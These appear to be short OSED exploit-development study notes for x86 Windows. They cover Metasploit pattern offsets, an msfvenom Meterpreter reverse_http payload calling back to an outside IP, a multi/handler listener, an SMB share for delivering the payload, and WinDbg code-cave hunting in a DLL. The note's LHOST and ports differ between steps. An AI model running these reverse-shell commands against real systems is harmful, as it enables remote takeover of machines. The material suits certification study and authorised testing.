# x86Win-OSED-Notes

# Pattern generation:
```
$ msf-pattern_create -l 800
$ msf-pattern_offset -l 800 -q 42306142
```

# met payload:
```
$ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe

# Exploit after met.exe execution
$ msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

# smbserver:
```
sudo smbserver.py met /home/kali/ -smb2support
```

# Code cave search:
we can find the offset to the PE header by dumping the DWORD at offset 0x3C from the MZ header. Then, add 0x2C to the offset to find the offset to the code section
```
0:077> dd libeay32IBM019 + 3c L1
031f003c 00000108
0:077> dd libeay32IBM019 + 108 + 2c L1
031f0134 00001000
0:077> ? libeay32IBM019 + 1000
Evaluate expression: 52367360 = 031f1000
```
Use the !address command to collect information about the code section.
```
0:077> !address 031f1000
Usage: Image
Base Address: 031f1000
End Address: 03283000
Region Size: 00092000 ( 584.000 kB)
State: 00001000 MEM_COMMIT
Protect: 00000020 PAGE_EXECUTE_READ
Type: 01000000 MEM_IMAGE
Allocation Base: 031f0000
Allocation Protect: 00000080 PAGE_EXECUTE_WRITECOPY
```
Check for sufficient size for code cave
```
0:077> dd 03283000-400
03282c00 00000000 00000000 00000000 00000000
03282c10 00000000 00000000 00000000 00000000
03282c20 00000000 00000000 00000000 00000000
03282c30 00000000 00000000 00000000 00000000
03282c40 00000000 00000000 00000000 00000000
03282c50 00000000 00000000 00000000 00000000
03282c60 00000000 00000000 00000000 00000000
03282c70 00000000 00000000 00000000 00000000

0:077> ? 03283000-400 - libeay32IBM019
Evaluate expression: 601088 = 00092c00

0:077> !address 03282c00
Usage: Image
Base Address: 031f1000
End Address: 03283000
Region Size: 00092000 ( 584.000 kB)
State: 00001000 MEM_COMMIT
Protect: 00000020 PAGE_EXECUTE_READ
Type: 01000000 MEM_IMAGE
Allocation Base: 031f0000
Allocation Protect: 00000080 PAGE_EXECUTE_WRITECOPY
```
Alternative: Use Pykd code caver: https://github.com/nop-tech/code_caver
```
!py C:\Users\admin\Desktop\code_caver.py <startAddress> <endAddress>
```
